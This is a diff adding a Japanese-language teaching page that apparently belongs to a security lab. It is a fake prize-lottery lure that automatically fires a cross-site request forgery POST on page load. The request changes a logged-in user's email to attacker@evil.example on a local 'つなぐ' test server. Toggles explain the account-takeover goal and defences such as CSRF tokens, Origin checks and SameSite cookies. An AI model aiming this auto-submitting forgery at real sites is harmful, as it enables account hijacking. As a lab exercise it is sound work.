@@ -1,0 +1,112 @@
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8">
+  <title>🎁 つなぐユーザー限定 プレゼント抽選</title>
+  <style>
+    body { font-family: sans-serif; padding:40px 16px; background:#111; color:#eee; margin:0; text-align:center; }
+    h1 { color:#ff5252; }
+    .gift { font-size:72px; margin:10px; }
+    .box { max-width:600px; margin:16px auto; text-align:left; }
+    code { background:#0a140e; padding:1px 5px; border-radius:4px; color:#9be8b4; font-size:12px; }
+    pre { background:#000; border:1px solid #333; border-radius:8px; padding:12px; overflow:auto; font-size:12px; color:#9be8b4; white-space:pre-wrap; word-break:break-all; max-width:600px; margin:12px auto; text-align:left; }
+
+    .panel { position: fixed; top:12px; right:12px; z-index:10; background:#fff; color:#333; border:1px solid #ccc; border-radius:10px; padding:12px 14px; text-align:left; font-size:13px; width:260px; box-shadow:0 2px 8px rgba(0,0,0,.3); }
+    .panel h2 { font-size:13px; margin:0 0 8px; color:#555; }
+    .panel label { display:flex; align-items:center; gap:6px; margin:6px 0; cursor:pointer; color:#333; }
+    .panel .hint { color:#888; font-size:11px; margin-top:4px; line-height:1.4; }
+    .panel hr { border:0; border-top:1px solid #eee; margin:10px 0; }
+    .status { font-weight:bold; border-radius:6px; padding:2px 8px; font-size:12px; background:#ffe5e5; color:#c0392b; }
+
+    .intent, .defense { display:none; border-radius:10px; padding:16px 18px; font-size:13px; line-height:1.7; margin:16px auto; max-width:600px; text-align:left; }
+    .intent { background:#1e1e1e; border:1px solid #ff5252; }
+    .defense { background:#12241a; border:1px solid #2ecc71; }
+    body.show-intent .intent { display:block; }
+    body.show-defense .defense { display:block; }
+    .intent h3 { margin:0 0 8px; color:#ff5252; font-size:14px; }
+    .defense h3 { margin:0 0 8px; color:#2ecc71; font-size:14px; }
+    .intent b { color:#ffd54f; }
+    .intent ol { margin:0; padding-left:1.2em; }
+  </style>
+</head>
+<body>
+  <div class="panel">
+    <h2>🔎 学習用コントロール</h2>
+    <label><input type="checkbox" id="toggleIntent"> 攻撃者の狙い(シナリオ)を表示</label>
+    <label><input type="checkbox" id="toggleDefense"> 🛡 対策の解説を表示</label>
+    <div class="hint">このページを開いた瞬間、裏で勝手に POST が送られます。</div>
+    <hr>
+    状態: <span class="status">脆弱（CSRF対策なし）</span>
+    <hr>
+    <label><input type="checkbox" id="armed" checked> ページを開いたら自動で攻撃する</label>
+  </div>
+
+  <h1>🎁 おめでとうございます！</h1>
+  <div class="gift">🎉🎁🎉</div>
+  <p>あなたは「つなぐ」プレゼント抽選に当選しました！</p>
+  <p style="color:#aaa">（…というのは口実で、実はこのページを開いただけで攻撃が走っています）</p>
+
+  <pre id="log">待機中…</pre>
+
+  <!-- ★ CSRF の仕掛け ★
+       利用者が「つなぐ」にログイン中であれば、このフォームの自動送信だけで
+       本人のメールアドレスが攻撃者のものに書き換わる(トークンも Origin 検査も無いため)。
+       実際の CSRF では見えない iframe 等に送るが、ここでは学習用に挙動をログ表示する。 -->
+  <form id="csrf" action="http://localhost:8080/account/email" method="POST" style="display:none">
+    <input name="email" value="attacker@evil.example">
+  </form>
+
+  <div class="intent">
+    <h3>🎯 攻撃者の狙い（CSRF / Netflix 2006）</h3>
+    <ol>
+      <li>利用者が<b>「つなぐ」にログイン中</b>のまま、この当選ページを開く。</li>
+      <li>ページが<b>自動でメール変更の POST を送信</b>する（利用者は気づかない）。</li>
+      <li>登録メールが<b>攻撃者のアドレスに書き換わる</b>。</li>
+      <li>攻撃者は<b>パスワード再設定</b>を自分のメールで受け取り、<b>アカウントを乗っ取る</b>。</li>
+      <li>Netflix の CSRF では、同じ要領で配送先変更やレンタル希望の追加が勝手に行われた。</li>
+    </ol>
+  </div>
+
+  <div class="defense">
+    <h3>🛡 対策した場合（CSRFトークン / Origin 検査 / SameSite）</h3>
+    <p>状態を変える操作には、フォーム表示時に発行した<b>CSRFトークン</b>を必須にし、
+       送信値と一致しなければ拒否します。攻撃者は正しいトークンを知り得ないため失敗します。
+       あわせて <b>Origin/Referer の検査</b>や <code>Cookie; SameSite=Lax</code> も有効です
+       （<code>app.ts</code> のコメント参照）。</p>
+  </div>
+
+  <script>
+    const intent = document.getElementById('toggleIntent');
+    const defense = document.getElementById('toggleDefense');
+    const armed = document.getElementById('armed');
+    const log = document.getElementById('log');
+
+    intent.addEventListener('change', () => document.body.classList.toggle('show-intent', intent.checked));
+    defense.addEventListener('change', () => document.body.classList.toggle('show-defense', defense.checked));
+
+    async function attack() {
+      log.textContent = 'POST http://localhost:8080/account/email  (email=attacker@evil.example)\n送信中…';
+      try {
+        // 実際の CSRF と同じく、トークンを付けずに本人のセッションで状態を変える。
+        await fetch('http://localhost:8080/account/email', {
+          method: 'POST',
+          headers: { 'content-type': 'application/x-www-form-urlencoded' },
+          body: 'email=attacker@evil.example',
+        });
+        const res = await fetch('http://localhost:8080/account');
+        const json = await res.json();
+        log.textContent =
+          '✅ 攻撃成功: 登録メールが書き換わりました。\n\n' +
+          'GET /account → ' + JSON.stringify(json) + '\n\n' +
+          '※ 対策(CSRFトークン等)があれば、この POST は 403 で弾かれます。';
+      } catch (e) {
+        log.textContent =
+          'リクエスト失敗。標的(localhost:8080)が起動しているか確認してください。\n' + e;
+      }
+    }
+
+    // ページを開いた瞬間に自動実行(本物の CSRF と同じ挙動)。
+    window.addEventListener('load', () => { if (armed.checked) attack(); });
+  </script>
+</body>
+</html>
